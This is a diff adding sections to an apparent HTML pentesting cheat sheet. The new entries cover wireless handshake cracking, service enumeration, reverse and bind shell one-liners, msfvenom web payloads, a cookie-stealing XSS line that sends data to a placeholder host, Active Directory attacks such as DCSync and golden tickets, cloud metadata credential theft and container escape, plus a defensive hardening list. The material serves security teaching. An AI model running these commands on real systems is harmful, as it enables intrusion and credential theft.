@@ -228,6 +228,28 @@
     <div><dt>bloodhound-python -d corp.local -u USER -p PASS -c all</dt><dd>Collect every AD relationship into BloodHound to graph the shortest path to Domain Admin.</dd></div>
   </dl>
 
+  <h4>Wireless reconnaissance (aircrack-ng suite)</h4>
+  <dl class="fm">
+    <div><dt>iwconfig  /  airmon-ng</dt><dd>List wireless interfaces and modes; airmon-ng manages monitor mode (Ch. 6, Part XII).</dd></div>
+    <div><dt>airmon-ng start wlan0</dt><dd>Put the adapter into <b>monitor mode</b> (<code>wlan0mon</code>) so it captures all nearby 802.11 frames.</dd></div>
+    <div><dt>airodump-ng wlan0mon</dt><dd>Survey the air &mdash; every AP and client in range with BSSID, channel, and encryption.</dd></div>
+    <div><dt>airodump-ng -c 6 --bssid AP -w cap wlan0mon</dt><dd>Lock onto one AP/channel and record its traffic &mdash; waits to capture the WPA handshake.</dd></div>
+    <div><dt>aireplay-ng --deauth 5 -a AP -c CLIENT wlan0mon</dt><dd>Deauth a client to force a reconnect and capture the handshake (authorized testing only).</dd></div>
+    <div><dt>aircrack-ng -w rockyou.txt cap.cap</dt><dd>Crack the captured WPA/WPA2 handshake against a wordlist, offline.</dd></div>
+    <div><dt>hcxdumptool / hcxpcapngtool</dt><dd>Capture PMKID/handshakes and convert them to hashcat mode 22000 &mdash; the modern WPA path.</dd></div>
+  </dl>
+
+  <h4>SNMP, SMTP, NFS &amp; other services</h4>
+  <dl class="fm">
+    <div><dt>snmpwalk -v2c -c public IP</dt><dd>Walk an SNMP tree with the default community string &mdash; leaks processes, users, routes, software.</dd></div>
+    <div><dt>onesixtyone -c communities.txt IP</dt><dd>Brute-force SNMP community strings fast.</dd></div>
+    <div><dt>smtp-user-enum -M RCPT -U users.txt -t IP</dt><dd>Enumerate valid mail accounts via SMTP VRFY/EXPN/RCPT.</dd></div>
+    <div><dt>showmount -e IP</dt><dd>List exported <b>NFS</b> shares &mdash; world-readable exports are a classic data leak and privesc path.</dd></div>
+    <div><dt>nmap --script ftp-anon -p21 IP</dt><dd>Test for anonymous FTP login.</dd></div>
+    <div><dt>nmap --script smb-vuln* -p445 IP</dt><dd>Check SMB for known vulns (EternalBlue / MS17-010 and kin) before touching exploits.</dd></div>
+    <div><dt>whois DOMAIN  /  whois IP</dt><dd>Ownership, netblock, and registrar data &mdash; the start of passive recon and ASN mapping.</dd></div>
+  </dl>
+
   <!-- ===================== PART III ===================== -->
   <h2 id="part3">Part III &mdash; Exploitation &amp; Password Attacks (Red)</h2>
   <div class="roles"><span class="role red">Pentester</span><span class="role red">Red Teamer</span><span class="role red">Exploit Dev</span><span class="role blue">Blue (recognize the artifacts these leave)</span></div>
@@ -279,6 +301,26 @@
     <div><dt>certutil -urlcache -f http://IP/s.exe s.exe</dt><dd>The Windows equivalent &mdash; download a file with a built-in binary (a known LOLBin).</dd></div>
     <div><dt>impacket-smbserver share . -smb2support</dt><dd>Stand up an SMB share so Windows targets can <code>copy \\IP\share\tool.exe</code>.</dd></div>
     <div><dt>scp FILE USER@IP:/tmp/</dt><dd>Copy a file over SSH when you already have credentials.</dd></div>
+  </dl>
+
+  <h4>More shells, payloads &amp; local exploits</h4>
+  <dl class="fm">
+    <div><dt>nc -lvnp 4444 -e /bin/bash</dt><dd><b>Bind</b> shell &mdash; the target listens and you connect in (for when it can&rsquo;t reach back out to you).</dd></div>
+    <div><dt>php -r '$s=fsockopen("IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</dt><dd>PHP reverse shell one-liner &mdash; for a compromised PHP application.</dd></div>
+    <div><dt>perl -e 'use Socket;...connect...exec("/bin/sh -i");'</dt><dd>Perl reverse shell &mdash; present on nearly every Unix host when python and bash are locked down.</dd></div>
+    <div><dt>msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -o sh.php</dt><dd>Generate a web payload to drop through a file-upload flaw (Ch. 6, Part V).</dd></div>
+    <div><dt>msfvenom -p windows/.../reverse_tcp ... -f aspx -o s.aspx</dt><dd>ASP.NET payload for IIS upload points; swap <code>-f</code> for war/jsp as the stack dictates.</dd></div>
+    <div><dt>searchsploit SOFTWARE VERSION</dt><dd>Search the local Exploit-DB mirror for a public exploit; <code>-m</code> copies it into your working dir.</dd></div>
+    <div><dt>pwncat-cs -lp 4444</dt><dd>A modern netcat replacement that auto-stabilizes the shell and adds upload/download and persistence helpers.</dd></div>
+  </dl>
+
+  <h4>Web injection by hand (XSS, SSTI, LFI)</h4>
+  <dl class="fm">
+    <div><dt>&lt;script&gt;fetch('//IP/'+document.cookie)&lt;/script&gt;</dt><dd>Reflected/stored <b>XSS</b> probe &mdash; proves script execution and cookie theft (Ch. 6, Part V).</dd></div>
+    <div><dt>${7*7}   {{7*7}}   &lt;%= 7*7 %&gt;</dt><dd><b>SSTI</b> probes &mdash; a rendered <code>49</code> betrays a template-injection path toward RCE.</dd></div>
+    <div><dt>curl "URL?page=php://filter/convert.base64-encode/resource=index"</dt><dd>PHP-filter trick to read source through an LFI &mdash; recover secrets and widen the foothold.</dd></div>
+    <div><dt>curl -G "URL" --data-urlencode "cmd=id"</dt><dd>Confirm command injection while URL-encoding the payload so the server parses it intact.</dd></div>
+    <div><dt>Burp Suite / OWASP ZAP (intercepting proxy)</dt><dd>Capture, modify, and replay every request &mdash; the manual web-testing workflow behind these one-liners.</dd></div>
   </dl>
 
   <!-- ===================== PART IV ===================== -->
@@ -336,6 +378,27 @@
     <div><dt>echo "KEY" &gt;&gt; ~/.ssh/authorized_keys</dt><dd>Drop your public key for passwordless re-entry.</dd></div>
     <div><dt>reg add HKCU\...\Run /v X /t REG_SZ /d "CMD"</dt><dd>Windows Run-key persistence &mdash; runs your command at every logon (Ch. 6, Part X).</dd></div>
     <div><dt>schtasks /create /tn X /tr "CMD" /sc onlogon</dt><dd>Scheduled-task persistence triggered on logon.</dd></div>
+  </dl>
+
+  <h4>Active Directory attacks (Kerberos, ADCS, DCSync)</h4>
+  <dl class="fm">
+    <div><dt>GetNPUsers.py corp/ -usersfile users.txt -no-pass</dt><dd><b>AS-REP roasting</b> &mdash; pull crackable hashes for accounts that lack Kerberos pre-auth.</dd></div>
+    <div><dt>Rubeus.exe kerberoast  /  asreproast</dt><dd>The Windows-native Kerberos toolkit &mdash; roasting, ticket requests, pass-the-ticket.</dd></div>
+    <div><dt>certipy find -vulnerable -u USER -p PASS -dc-ip IP</dt><dd>Enumerate <b>AD Certificate Services</b> misconfigs (ESC1&ndash;ESC8) &mdash; a top modern domain-takeover path.</dd></div>
+    <div><dt>secretsdump.py -just-dc corp/USER@DC</dt><dd><b>DCSync</b> &mdash; with replication rights, pull every domain hash, krbtgt included.</dd></div>
+    <div><dt>ticketer.py -nthash KRBTGT -domain-sid SID -domain corp.local Administrator</dt><dd>Forge a <b>golden ticket</b> to demonstrate full, persistent domain compromise (authorized tests only).</dd></div>
+    <div><dt>crackmapexec smb TARGETS -u u -p p --continue-on-success</dt><dd><b>Password spraying</b> one password across many accounts &mdash; the quiet way into AD (Ch. 6, Part VIII).</dd></div>
+  </dl>
+
+  <h4>Cloud, container &amp; mobile post-access</h4>
+  <dl class="fm">
+    <div><dt>aws sts get-caller-identity</dt><dd>Confirm which cloud identity a found key belongs to &mdash; the first move after credential theft (Ch. 6, Part XV).</dd></div>
+    <div><dt>aws s3 ls  /  aws iam list-attached-user-policies --user-name U</dt><dd>Enumerate reachable storage and your own permissions &mdash; map the blast radius.</dd></div>
+    <div><dt>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</dt><dd>Query the <b>instance metadata service</b> for temporary cloud creds &mdash; the SSRF pivot (Ch. 6, Part XV).</dd></div>
+    <div><dt>kubectl auth can-i --list</dt><dd>List what your Kubernetes token is allowed to do &mdash; the cluster privesc map.</dd></div>
+    <div><dt>kubectl get secrets -A -o yaml</dt><dd>Dump cluster secrets where RBAC permits &mdash; often the keys to everything else.</dd></div>
+    <div><dt>docker run -v /:/host --rm -it IMG chroot /host sh</dt><dd>Classic <b>container escape</b> when a privileged run or the Docker socket is exposed (Ch. 6, Part XV).</dd></div>
+    <div><dt>adb shell  /  adb install app.apk</dt><dd>Android Debug Bridge &mdash; the entry point for authorized <b>mobile</b> testing (Ch. 6, Part XIV).</dd></div>
   </dl>
 
   <div class="danger">
@@ -453,6 +516,17 @@
     <div><dt>strings -n 8 FILE | less  /  binwalk FILE</dt><dd>Pull readable text and carve embedded data from a suspect binary or firmware (Ch. 6, Part XIII).</dd></div>
     <div><dt>yara -r rules.yar /path  /  clamscan -r /path</dt><dd>Scan disk for known-bad patterns &mdash; YARA for custom signatures, ClamAV for commodity malware.</dd></div>
     <div><dt>chkrootkit  /  rkhunter --check</dt><dd>Check a Linux host for known rootkits and tampering.</dd></div>
+  </dl>
+
+  <h4>Hardening &amp; proactive monitoring (Blue)</h4>
+  <dl class="fm">
+    <div><dt>lynis audit system</dt><dd>Run a full host security audit with a hardening index and prioritized fixes.</dd></div>
+    <div><dt>fail2ban-client status sshd</dt><dd>Check the jail that auto-bans brute-force sources &mdash; frontline defense for any exposed service.</dd></div>
+    <div><dt>auditctl -w /etc/passwd -p wa -k identity</dt><dd>Watch a sensitive file for writes and tag the events &mdash; detection engineering at the kernel.</dd></div>
+    <div><dt>aide --init  /  aide --check</dt><dd>Build and verify a <b>file-integrity</b> baseline &mdash; catch tampered binaries and planted files.</dd></div>
+    <div><dt>osqueryi "SELECT * FROM listening_ports;"</dt><dd>Query the live host like a database (osquery) &mdash; the basis of fleet-wide hunting in SQL.</dd></div>
+    <div><dt>sysctl kernel.randomize_va_space; sshd -T</dt><dd>Verify exploit-mitigation and effective SSH settings &mdash; confirm the hardening actually applied.</dd></div>
+    <div><dt>velociraptor / GRR (fleet DFIR)</dt><dd>Hunt and collect artifacts across thousands of endpoints at once &mdash; the enterprise response platform.</dd></div>
   </dl>
 
   <div class="note">
